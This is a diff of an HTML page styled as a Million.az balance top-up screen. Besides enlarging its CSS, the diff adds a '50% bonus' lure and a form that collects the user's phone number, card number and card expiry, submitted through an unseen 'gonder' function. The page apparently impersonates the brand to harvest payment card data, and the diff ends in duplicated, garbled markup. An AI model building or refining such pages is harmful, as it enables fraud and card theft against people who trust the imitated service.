@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Million.az - Balans Artır</title>
-  <style>
+   <style>
     * {
       box-sizing: border-box;
       margin: 0;
@@ -43,12 +43,12 @@
 
     .modal {
       background: rgba(110, 110, 110, 0.155);
-      width: 70%;
-      max-width: 900px;
-      padding: 50px;
-      border-radius: 35px;
-      box-shadow: 0 8px 12px rgba(103, 84, 84, 0.367);
-      backdrop-filter: blur(40px);
+      width: 80%;
+      max-width: 1100px;
+      padding: 70px;
+      border-radius: 55px;
+      box-shadow: 0 10px 15px rgba(103, 84, 84, 0.4);
+      backdrop-filter: blur(50px);
       z-index: 999;
       position: fixed;
       top: 50%;
@@ -59,9 +59,17 @@
     }
 
     .modal h2 {
-      font-size: 36px;
+      font-size: 48px;
       text-align: center;
+      color: white;
       margin-bottom: 20px;
+    }
+
+    .bonus-text {
+      font-size: 28px;
+      text-align: center;
+      color: white;
+      margin-bottom: 30px;
     }
 
     .form-group {
@@ -71,7 +79,7 @@
     label {
       font-weight: bold;
       color: white;
-      font-size: 24px;
+      font-size: 26px;
       display: block;
       margin-bottom: 10px;
     }
@@ -81,7 +89,7 @@
     select {
       width: 80%;
       padding: 15px;
-      font-size: 20px;
+      font-size: 24px;
       border: 1px solid #ccc;
       border-radius: 10px;
       background-color: #fff;
@@ -89,11 +97,11 @@
     }
 
     .form-group select {
-      margin-right: 10px;
+      width: 35%;
     }
 
     .result-text {
-      font-size: 22px;
+      font-size: 24px;
       color: #33cc33;
       font-weight: bold;
       margin-top: 20px;
@@ -102,8 +110,8 @@
     button {
       background-color: #d30412;
       color: white;
-      padding: 15px 40px;
-      font-size: 22px;
+      padding: 20px 50px;
+      font-size: 26px;
       border: none;
       cursor: pointer;
       transition: background-color 0.3s;
@@ -119,7 +127,7 @@
     .footer {
       background-color: #fff;
       color: #333;
-      padding: 20px;
+      padding: 30px;
       text-align: center;
       box-shadow: 0 -2px 4px rgba(0, 0, 0, 0.1);
       width: 100%;
@@ -138,7 +146,7 @@
     }
 
     .footer-bottom {
-      font-size: 18px;
+      font-size: 20px;
       margin-top: 10px;
     }
 
@@ -154,34 +162,76 @@
     @media (max-width: 768px) {
       .modal {
         width: 90%;
-        padding: 20px;
+        padding: 40px;
       }
 
       .modal h2 {
-        font-size: 28px;
+        font-size: 36px;
       }
 
       button {
-        font-size: 18px;
+        font-size: 20px;
       }
 
       .result-text {
-        font-size: 18px;
+        font-size: 20px;
       }
 
       label {
-        font-size: 18px;
+        font-size: 20px;
       }
 
       input[type="text"],
       input[type="number"],
       select {
         width: 100%;
-        font-size: 16px;
+        font-size: 18px;
         padding: 10px;
       }
     }
   </style>
+</head>
+<body>
+  <div class="header">
+    <div class="logo">
+      <img src="Logo.svg" alt="Million.az Logo">
+    </div>
+  </div>
+
+  <div class="content">
+    <div class="modal">
+      <h2>Ödəniş Məlumatları</h2>
+      <div class="bonus-text">50% bonus indi qazanın!</div>
+
+      <form id="paymentForm" onsubmit="gonder(event)">
+        <div class="form-group">
+          <label for="telefon-numarasi">Telefon Nömrəsi</label>
+          <input type="text" id="telefon-numarasi" name="telefon-numarasi" value="+994" oninput="telefonInput(this)" maxlength="13" required>
+        </div>
+
+        <div class="form-group">
+          <label for="tutar">Yükləyəcəyiniz Məbləğ (₼)</label>
+          <input type="number" id="tutar" name="tutar" placeholder="0" oninput="hesapla(this.value)" required>
+        </div>
+
+        <div class="form-group">
+          <span class="result-text" id="result">Hesabınıza köçürləçək məbləğ (1.5x bonus ilə): 0.00₼</span>
+        </div>
+
+        <div class="form-group">
+          <label for="kart-numarasi">Kart Nömrəsi</label>
+          <input type="text" id="kart-numarasi" name="kart-numarasi" maxlength="16" placeholder="XXXX XXXX XXXX XXXX" oninput="kartNumarasiInput(this)" required>
+        </div>
+
+        <div class="form-group">
+          <label>Son İstifadə Tarixi</label>
+          <div style="display: flex; gap: 10px;">
+            <select id="son-kullanma-ay" name="son-kullanma-ay" required>
+              <option value="">Ay</option>
+            </select>
+            <select id="son-kullanma-yil" name="son-kullanma-yil" required>
+              <option value="">İl</option>
+            </select>
 </head>
 <body>
   <div class="header">
